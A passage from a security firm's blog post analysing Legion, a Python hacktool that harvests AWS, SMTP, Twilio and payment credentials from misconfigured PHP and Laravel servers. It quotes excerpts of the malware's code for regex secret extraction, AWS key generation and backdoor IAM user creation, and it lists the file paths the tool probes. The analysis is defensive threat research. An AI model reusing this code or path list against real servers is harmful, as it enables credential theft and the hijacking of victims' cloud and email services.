      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/endpoint-triage" role="menuitem">Endpoint Triage</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/saas-investigations" role="menuitem">SaaS Investigations</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/cloud-detection-and-response" role="menuitem">Cloud Detection &amp; Response (CDR)</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/evidence-preservation" role="menuitem">Evidence Preservation</a></li>
     </ul></li>
    <li class="hs-menu-item hs-menu-depth-2 hs-item-has-children" role="none"><a href="javascript:;" role="menuitem">Cado For</a>
     <ul role="menu" class="hs-menu-children-wrapper">
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/dfir" role="menuitem">DFIR</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/security-operations-center" role="menuitem">SOC</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/mssp" role="menuitem">MSSPs</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/partners" role="menuitem">Partners</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/government" role="menuitem">Government</a></li>
     </ul></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="javascript:;" aria-haspopup="true" aria-expanded="false" role="menuitem">Resources</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/resources" role="menuitem">All Resources</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/blog" role="menuitem">Blog</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/news-and-events" role="menuitem">News</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/cado-community-edition" role="menuitem">Community</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://docs.cadosecurity.com/cado-response/intro" role="menuitem" target="_blank" rel="noopener">Documentation</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/wiki" role="menuitem">Wiki</a></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="javascript:;" aria-haspopup="true" aria-expanded="false" role="menuitem">Company </a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/about" role="menuitem">About</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/careers" role="menuitem">Careers</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/cado-security-labs" role="menuitem">Cado Security Labs</a></li>
   </ul></li>
 </ul>
</div></span>
        </div>
        
        
        <div class="mobile-cta">
          <span id="hs_cos_wrapper_u4m-header_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_cta" style="" data-hs-cos-general-type="widget" data-hs-cos-type="cta"><!--HubSpot Call-to-Action Code --><span class="hs-cta-wrapper" id="hs-cta-wrapper-a51b72aa-daa5-4df8-a061-1902834ccdb0"><span class="hs-cta-node hs-cta-a51b72aa-daa5-4df8-a061-1902834ccdb0" id="hs-cta-a51b72aa-daa5-4df8-a061-1902834ccdb0"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/14518100/a51b72aa-daa5-4df8-a061-1902834ccdb0"><img class="hs-cta-img" id="hs-cta-img-a51b72aa-daa5-4df8-a061-1902834ccdb0" style="border-width:0px;" src="https://no-cache.hubspot.com/cta/default/14518100/a51b72aa-daa5-4df8-a061-1902834ccdb0.png" alt="Get a Demo"></a></span><script charset="utf-8" src="/hs/cta/cta/current.js"></script><script type="text/javascript"> hbspt.cta._relativeUrls=true;hbspt.cta.load(14518100, 'a51b72aa-daa5-4df8-a061-1902834ccdb0', {"useNewLoader":"true","region":"na1"}); </script></span><!-- end HubSpot Call-to-Action Code --></span>  
        </div>
        
        
      </div>
    </div>
  </div>
  
  <div class="search-overlay">
  <div class="hs-search-field"> 
  <div class="hs-search-field__bar"> 
    <form action="/hs-search-results">
      <input type="text" class="hs-search-field__input search-input" name="term" autocomplete="off" aria-label="Search" placeholder="Search">
      
      
      <input type="hidden" name="type" value="SITE_PAGE">
      <input type="hidden" name="type" value="LANDING_PAGE">
      <input type="hidden" name="type" value="BLOG_POST">
      <input type="hidden" name="type" value="LISTING_PAGE">
      <input type="hidden" name="type" value="KNOWLEDGE_ARTICLE">     
      
      
          
      
      
      
      
      <button aria-label="Search" class="search-button">
        
        <svg width="18px" height="18px" viewbox="0 0 18 18" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
          <g id="Round-Three-Design" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
              <g id="CADO-Additional-Modules-R3" transform="translate(-1299, -58)" fill="#0E4271" fill-rule="nonzero">
                  <g id="search_FILL0_wght400_GRAD0_opsz24-(6)-Copy" transform="translate(1299, 58)">
                      <path d="M16.6,18 L10.3,11.7 C9.8,12.1 9.225,12.4166667 8.575,12.65 C7.925,12.8833333 7.23333333,13 6.5,13 C4.68333333,13 3.14583333,12.3708333 1.8875,11.1125 C0.629166667,9.85416667 0,8.31666667 0,6.5 C0,4.68333333 0.629166667,3.14583333 1.8875,1.8875 C3.14583333,0.629166667 4.68333333,0 6.5,0 C8.31666667,0 9.85416667,0.629166667 11.1125,1.8875 C12.3708333,3.14583333 13,4.68333333 13,6.5 C13,7.23333333 12.8833333,7.925 12.65,8.575 C12.4166667,9.225 12.1,9.8 11.7,10.3 L18,16.6 L16.6,18 Z M6.5,11 C7.75,11 8.8125,10.5625 9.6875,9.6875 C10.5625,8.8125 11,7.75 11,6.5 C11,5.25 10.5625,4.1875 9.6875,3.3125 C8.8125,2.4375 7.75,2 6.5,2 C5.25,2 4.1875,2.4375 3.3125,3.3125 C2.4375,4.1875 2,5.25 2,6.5 C2,7.75 2.4375,8.8125 3.3125,9.6875 C4.1875,10.5625 5.25,11 6.5,11 Z" id="Shape"></path>
                  </g>
              </g>
          </g>
        </svg>
      </button>      

      <span class="search-overlay-close search-toggle-button" aria-label="Close">
        <i class="fas fa-times" aria-hidden="true"></i>
      </span>

    </form>
  </div>
  <ul class="hs-search-field__suggestions"></ul>
</div>
  </div> 
  
</header></div>
    

    

<main id="main-content" class="body-container-wrapper">

  

  <section class="u4m-blog-post">
    <!-- Blog Post Hero -->
    <div class="hero">
      <img class="left-curve-design" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Shapes/blog-curve-hero.svg" alt="curve design on left">
      <img data-aos="fade-right" data-aos-duration="800" class="right-image" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Images/Clouds/cloud-blog.svg" alt="cloud image">

      <div class="content">
        <span class="date"></span>
        <h1 class="title"><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">Legion: an AWS Credential Harvester and SMTP Hijacker</span></h1>
        <div class="author-wrap">
          <div class="author-link">Written by: <a href="https://www.cadosecurity.com/blog/author/jbowencadosecurity-com">jbowen@cadosecurity.com</a></div>        
        </div>
      </div>
    </div>
    <!-- End Blog Post Hero -->
  
    <!-- Blog Post Body -->
    <div class="body" id="body">
      <div class="share" id="share">
          <a href="https://twitter.com/intent/tweet?original_referer=https://www.cadosecurity.com/blog/legion-an-aws-credential-harvester-and-smtp-hijacker&amp;url=https://www.cadosecurity.com/blog/legion-an-aws-credential-harvester-and-smtp-hijacker&amp;source=tweetbutton" target="_blank" aria-label="Twitter">
            <svg width="23.4185473px" height="24px" viewbox="0 0 23.4185473 24" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
              <g id="Round-Three-Design" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                  <g id="CADO-Homepage-R3" transform="translate(-200, -6761)" fill="#0E5DA3" fill-rule="nonzero">
                      <g id="logo" transform="translate(200, 6761)">
                          <path d="M13.9372166,10.1623621 L22.6552978,0 L20.5893916,0 L13.0194828,8.8238362 L6.97341888,0 L0,0 L9.14283504,13.3432031 L0,24 L2.06602327,24 L10.060042,14.681729 L16.4451284,24 L23.4185473,24 L13.9367092,10.1623621 L13.9372166,10.1623621 Z M11.1075145,13.4607598 L10.1811549,12.1320776 L2.81044034,1.55961545 L5.98373156,1.55961545 L11.931984,10.0919298 L12.8583437,11.4206121 L20.5903674,22.5113139 L17.4170762,22.5113139 L11.1075145,13.4612686 L11.1075145,13.4607598 Z" id="Shape"></path>
                      </g>
                  </g>
              </g>
            </svg>
          </a>
          <a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.cadosecurity.com/blog/legion-an-aws-credential-harvester-and-smtp-hijacker" target="_blank" aria-label="LinkedIn"><span class="fab fa-linkedin" aria-hidden="true"></span></a>
          <a href="http://www.facebook.com/share.php?u=https://www.cadosecurity.com/blog/legion-an-aws-credential-harvester-and-smtp-hijacker" target="_blank" aria-label="Facebook"><span class="fab fa-facebook" aria-hidden="true"></span></a>
          <a href="mailto:?subject=Check%20out%20https://www.cadosecurity.com/blog/legion-an-aws-credential-harvester-and-smtp-hijacker" aria-label="email"><span class="fa fa-envelope" aria-hidden="true"></span></a>
      </div>
      <div class="content"><span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p> 
 <!-- wp:image {"align":"center","id":7205,"sizeSlug":"full","linkDestination":"none"} --></p> 
<!--more--><figure class="wp-block-image aligncenter size-full"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image4-27.png" alt="" class="wp-image-7205"> 
 <br> 
 <figcaption class="wp-element-caption"> 
  <em>Legion splash screen</em> 
 </figcaption> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Cado Labs researchers recently encountered an emerging Python-based credential harvester and hacktool, named Legion, aimed at exploiting various services for the purpose of email abuse.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The tool is sold via the Telegram messenger, and includes modules dedicated to:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:list --></p> 
<ul> 
 <!-- wp:list-item --> 
 <li>enumerating vulnerable SMTP servers,&nbsp;</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>conducting Remote Code Execution (RCE),&nbsp;</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>exploiting vulnerable versions of Apache,</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>brute-forcing cPanel and WebHost Manager (WHM) accounts,</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>interacting with Shodan’s API to retrieve a target list (providing you supply an API key) and&nbsp;</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>additional utilities, many of which involve abusing AWS services</li> 
 <p> 
  <!-- /wp:list-item --></p> 
</ul> 
<p> 
 <!-- /wp:list --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Lacework blogged about a similar malware family back in December 2022, that they named <a href="https://www.lacework.com/blog/androxghost-the-python-malware-exploiting-your-aws-keys/">AndroxGh0st</a>. The sample encountered by Cado Labs appears to be related to AndroxGh0st and, at the time of writing, has 0 detections on <a href="https://www.virustotal.com/gui/file/fcd95a68cd8db0199e2dd7d1ecc4b7626532681b41654519463366e27f54e65a">VirusTotal</a>.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"align":"center","id":7206,"sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image aligncenter size-full"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image5-20.png" alt="" class="wp-image-7206"> 
 <br> 
 <figcaption class="wp-element-caption"> 
  <em>0 detections for legion.py</em> 
 </figcaption> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>During our initial analysis, we also realised that this was related to a more recent malware sample that Ian Ahl, from Permiso, had <a href="https://permiso.io/blog/s/approach-to-detection-androxgh0st-greenbot-persistence">analysed</a>. In the spirit of collaboration, and considering we have a shared interest in cloud security, we reached out to Ian to get his thoughts on this particular sample. He’s written a great blog with his perspective over on the <a href="https://permiso.io/blog/s/legion-mass-spam-attacks-in-aws">Permiso</a> site.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2>Legion.py Background</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The sample itself is a rather long (21015 line) Python3 script. Initial static analysis shows that the malware includes configurations for integrating with services such as Twilio and Shodan - more on this later. Telegram support is also included, with the ability to pipe the results of each of the modules into a Telegram chat via the Telegram Bot API.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:loos-hcb/code-block {"langType":"python","langName":"Python"} --></p> 
<div class="hcb_wrap"> 
 <pre class="prism undefined-numbers lang-python" data-lang="Python"><code>   cfg['SETTINGS'] = {}<br>
   cfg['SETTINGS']['EMAIL_RECEIVER'] = 'put your email'<br>
   cfg['SETTINGS']['DEFAULT_TIMEOUT'] = '20'<br>
   cfg['TELEGRAM'] = {}<br>
   cfg['TELEGRAM']['TELEGRAM_RESULTS'] = 'on'<br>
   cfg['TELEGRAM']['BOT_TOKEN'] = 'bot token telegram'<br>
   cfg['TELEGRAM']['CHAT_ID'] = 'chat id telegram'<br>
   cfg['SHODAN'] = {}<br>
   cfg['SHODAN']['APIKEY'] = 'ADD YOUR SHODAN APIKEY'<br>
   cfg['TWILIO'] = {}<br>
   cfg['TWILIO']['TWILIOAPI'] = 'ADD YOUR TWILIO APIKEY'<br>
   cfg['TWILIO']['TWILIOTOKEN'] = 'ADD YOUR TWILIO AUTHTOKEN'<br>
   cfg['TWILIO']['TWILIOFROM'] = 'ADD YOUR FROM NUMBER'<br>
   cfg['SCRAPESTACK'] = {}<br>
   cfg['SCRAPESTACK']['SCRAPESTACK_KEY'] = 'scrapestack_key'<br>
   cfg['AWS'] = {}<br>
   cfg['AWS']['EMAIL'] = 'put your email AWS test'</code></pre> 
</div> 
<p> 
 <!-- /wp:loos-hcb/code-block --></p> 
<p> 
 <!-- wp:paragraph {"align":"left"} --></p> 
<p class="has-text-align-left"><em>Legion.py - default configuration parameters</em></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>As mentioned above, the malware itself appears to be distributed via a public Telegram group. The sample also included references to a Telegram user with the handle myl3gion. At the time of writing, Cado researchers accessed the Telegram group to determine whether additional information about the campaign could be discovered.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Rather amusingly, one of the only recent messages was from the group owner warning members that the user myl3gion was in fact a scammer. There’s no additional context to this claim but it appears that the sample encountered by Cado Labs was “illegitimately” circulated by this user.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"align":"center","id":7207,"sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image aligncenter size-full"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image1-38.png" alt="" class="wp-image-7207"> 
 <br> 
 <figcaption class="wp-element-caption"> 
  <em>Scam warning from Telegram group administrator</em> 
 </figcaption> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>At the time of writing, the group had 1,090 members and the earliest messages were from February 2021.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Cado Labs researchers also encountered a YouTube channel named “Forza Tools”, which included a series of tutorial videos for using Legion. The fact that the developer behind the tool has gone to the effort of creating these videos, suggests that the tool is widely distributed and is likely paid malware.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"align":"center","id":7208,"sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image aligncenter size-full"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image3-31.png" alt="" class="wp-image-7208"> 
 <br> 
 <figcaption class="wp-element-caption"> 
  <em>Forza Tools Youtube Channel</em>&nbsp; 
 </figcaption> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2>Functionality</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>It’s clear from a cursory glance at the code, and from the YouTube tutorials described above, that the Legion credential harvester is primarily concerned with the exploitation of web servers running Content Management Systems (CMS), PHP, or PHP-based frameworks -&nbsp; such as Laravel.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>From these targeted servers, the tool uses a number of RegEx patterns to extract credentials for various web services. These include credentials for email providers, cloud service providers (AWS), server management systems, databases and payment systems - such as Stripe and PayPal. Typically, this type of tool would be used to hijack said services and use the infrastructure for mass spamming or opportunistic phishing campaigns.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Additionally, the malware also includes code to implant webshells, brute-force CPanel or AWS accounts and send SMS messages to a list of dynamically-generated US mobile numbers.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2>Credential Harvesting</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Legion contains a number of methods for retrieving credentials from misconfigured web servers. Depending on the web server software, scripting language or framework the server is running, the malware will attempt to request resources known to contain secrets, parse them and save the secrets into results files sorted on a per-service basis.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>One such resource is the .env environment variables file, which often contains application-specific secrets for Laravel and other PHP-based web applications. The malware maintains a list of likely paths to this file, as well as similar files and directories for other web technologies. Examples of these can be seen in the table below.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:table --></p> 
<figure class="wp-block-table"> 
 <table> 
  <tbody> 
   <tr> 
    <td><strong>Apache</strong></td> 
    <td><strong>Laravel</strong></td> 
    <td><strong>Generic Debug Paths</strong></td> 
   </tr> 
   <tr> 
    <td>/_profiler/phpinfo</td> 
    <td>/conf/.env</td> 
    <td>/debug/default/view?panel=config</td> 
   </tr> 
   <tr> 
    <td>/tool/view/phpinfo.view.php</td> 
    <td>/wp-content/.env</td> 
    <td>/tool/view/phpinfo.view.php</td> 
   </tr> 
   <tr> 
    <td>/debug/default/view.html</td> 
    <td>/library/.env</td> 
    <td>/debug/default/view.html</td> 
   </tr> 
   <tr> 
    <td>/frontend/web/debug/default/view</td> 
    <td>/vendor/.env</td> 
    <td>/frontend/web/debug/default/view</td> 
   </tr> 
   <tr> 
    <td>/.aws/credentials</td> 
    <td>/api/.env</td> 
    <td>/web/debug/default/view</td> 
   </tr> 
   <tr> 
    <td>/config/aws.yml</td> 
    <td>/laravel/.env</td> 
    <td>/sapi/debug/default/view</td> 
   </tr> 
   <tr> 
    <td>/symfony/public/_profiler/phpinfo</td> 
    <td>/sites/all/libraries/mailchimp/.env</td> 
    <td>/wp-config.php-backup</td> 
   </tr> 
  </tbody> 
 </table> 
</figure> 
<p> 
 <!-- /wp:table --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p><em>Examples of paths to web resources requested by Legion</em></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:loos-hcb/code-block {"langType":"python","langName":"Python"} --></p> 
<div class="hcb_wrap"> 
 <pre class="prism undefined-numbers lang-python" data-lang="Python"><code># grab password<br>
if 'DB_USERNAME=' in text:<br>
        method = './env'<br>
        db_user = re.findall("\nDB_USERNAME=(.*?)\n", text)[0]<br>
        db_pass = re.findall("\nDB_PASSWORD=(.*?)\n", text)[0]<br>
elif '&lt;td&gt;DB_USERNAME&lt;/td&gt;' in text:<br>
        method = 'debug'<br>
        db_user = re.findall('&lt;td&gt;DB_USERNAME&lt;\/td&gt;\s+&lt;td&gt;&lt;pre.*&gt;(.*?)&lt;\/span&gt;', text)[0]<br>
        db_pass = re.findall('&lt;td&gt;DB_PASSWORD&lt;\/td&gt;\s+&lt;td&gt;&lt;pre.*&gt;(.*?)&lt;\/span&gt;', text)[0]</code></pre> 
</div> 
<p> 
 <!-- /wp:loos-hcb/code-block --></p> 
<p> 
 <!-- wp:paragraph {"align":"left"} --></p> 
<p class="has-text-align-left"><em>Example of RegEx parsing code to retrieve database credentials from requested resources</em></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:loos-hcb/code-block {"langType":"python","langName":"Python"} --></p> 
<div class="hcb_wrap"> 
 <pre class="prism undefined-numbers lang-python" data-lang="Python"><code>if '&lt;td&gt;#TWILIO_SID&lt;/td&gt;' in text:<br>
                  acc_sid = re.findall('&lt;td&gt;#TWILIO_SID&lt;\\/td&gt;\\s+&lt;td&gt;&lt;pre.*&gt;(.*?)&lt;\\/span&gt;', text)[0]<br>
                  auhtoken = re.findall('&lt;td&gt;#TWILIO_AUTH&lt;\\/td&gt;\\s+&lt;td&gt;&lt;pre.*&gt;(.*?)&lt;\\/span&gt;', text)[0]<br>
                  build = cleanit(url + '|' + acc_sid + '|' + auhtoken)<br>
                  remover = str(build).replace('\r', '')<br>
                  print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TWILIO {fc}[{yl}{acc_sid}{res}:{fc}{acc_key}{fc}]")<br>
                  save = open(o_twilio, 'a')<br>
                  save.write(remover+'\n')<br>
                  save.close()</code></pre> 
</div> 
<p> 
 <!-- /wp:loos-hcb/code-block --></p> 
<p> 
 <!-- wp:paragraph {"align":"left"} --></p> 
<p class="has-text-align-left"><em>Example of RegEx parsing code to retrieve Twilio secrets from requested resources</em></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>A full list of the services the malware attempts to extract credentials for can be seen in the table below.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:table --></p> 
<figure class="wp-block-table"> 
 <table> 
  <tbody> 
   <tr> 
    <td><strong>Services Targeted</strong></td> 
   </tr> 
   <tr> 
    <td>Twilio</td> 
   </tr> 
   <tr> 
    <td>Nexmo</td> 
   </tr> 
   <tr> 
    <td>Stripe/Paypal (payment API function)</td> 
   </tr> 
   <tr> 
    <td>AWS console credentials</td> 
   </tr> 
   <tr> 
    <td>AWS SNS, S3 and SES specific credentials</td> 
   </tr> 
   <tr> 
    <td>Mailgun</td> 
   </tr> 
   <tr> 
    <td>Plivo</td> 
   </tr> 
   <tr> 
    <td>Clicksend</td> 
   </tr> 
   <tr> 
    <td>Mandrill</td> 
   </tr> 
   <tr> 
    <td>Mailjet</td> 
   </tr> 
   <tr> 
    <td>MessageBird</td> 
   </tr> 
   <tr> 
    <td>Vonage</td> 
   </tr> 
   <tr> 
    <td>Nexmo</td> 
   </tr> 
   <tr> 
    <td>Exotel</td> 
   </tr> 
   <tr> 
    <td>Onesignal</td> 
   </tr> 
   <tr> 
    <td>Clickatel</td> 
   </tr> 
   <tr> 
    <td>Tokbox</td> 
   </tr> 
   <tr> 
    <td>SMTP credentials</td> 
   </tr> 
   <tr> 
    <td>Database Administration and CMS credentials (CPanel, WHM, PHPmyadmin)</td> 
   </tr> 
  </tbody> 
 </table> 
</figure> 
<p> 
 <!-- /wp:table --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p><em>Full list of services targeted by Legion</em></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2>AWS Features</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>As discussed in the previous section, Legion will attempt to retrieve credentials from insecure or misconfigured web servers. Of particular interest to those in cloud security is the malware’s ability to retrieve AWS credentials.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Not only does the malware claim to harvest these from target sites, but it also includes a function dedicated to brute-forcing AWS credentials - named aws_generator().</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:loos-hcb/code-block {"langType":"python","langName":"Python"} --></p> 
<div class="hcb_wrap"> 
 <pre class="prism undefined-numbers lang-python" data-lang="Python"><code>def aws_generator(self, length, region):<br>
    chars = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","/","/"]<br>
    chars = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9"]<br>
    def aws_id():<br>
        output = "AKIA"<br>
        for i in range(16):<br>
            output += random.choice(chars[0:38]).upper()<br>
        return output<br>
    def aws_key():<br>
        output = ""<br>
        for i in range(40):<br>
            if i == 0 or i == 39:<br>
                randUpper = random.choice(chars[0:38]).upper()<br>
                output += random.choice([randUpper, random.choice(chars[0:38])])<br>
            else:<br>
                randUpper = random.choice(chars[0:38]).upper()<br>
                output += random.choice([randUpper, random.choice(chars)])<br>
        return output<br>
    self.show_info_message(message="Generating Total %s Of AWS Key, Please Wait....." % length)</code></pre> 
</div> 
<p> 
 <!-- /wp:loos-hcb/code-block --></p> 
<p> 
 <!-- wp:paragraph {"align":"left"} --></p> 
<p class="has-text-align-left"><em>Example of AWS credential generation code</em></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>This is consistent with Lacework’s <a href="https://www.lacework.com/blog/androxghost-the-python-malware-exploiting-your-aws-keys/">analysis</a> of AndroxGh0st, and we agree with their conclusion that it seems statistically unlikely that this functionality would result in usable credentials. Similar code for brute-forcing SendGrid (an email marketing company) credentials is also included.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Regardless of how credentials are obtained, the malware attempts to add an IAM user with the hardcoded username of ses_legion. Interestingly, in this sample of Legion the malware also tags the created user with the key “Owner” and a hardcoded value of “ms.boharas”.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:loos-hcb/code-block {"langType":"python","langName":"Python"} --></p> 
<div class="hcb_wrap"> 
 <pre class="prism undefined-numbers lang-python" data-lang="Python"><code>def create_new_user(iam_client, user_name='ses_legion'):<br>
        user = None<br>
        try:<br>
                user = iam_client.create_user(<br>
                        UserName=user_name,<br>
                        Tags=[{'Key': 'Owner', 'Value': 'ms.boharas'}]<br>
                    )<br>
        except ClientError as e:<br>
                if e.response['Error']['Code'] == 'EntityAlreadyExists':<br>
                        result_str = get_random_string()<br>
                        user_name = 'ses_{}'.format(result_str)<br>
                        user = iam_client.create_user(UserName=user_name,<br>
                        Tags=[{'Key': 'Owner', 'Value': 'ms.boharas'}]<br>
                    )<br>
        return user_name, user</code></pre> 
</div> 
<p> 
 <!-- /wp:loos-hcb/code-block --></p> 
<p> 
 <!-- wp:paragraph {"align":"left"} --></p> 
<p class="has-text-align-left"><em>IAM user creation and tagging code</em></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
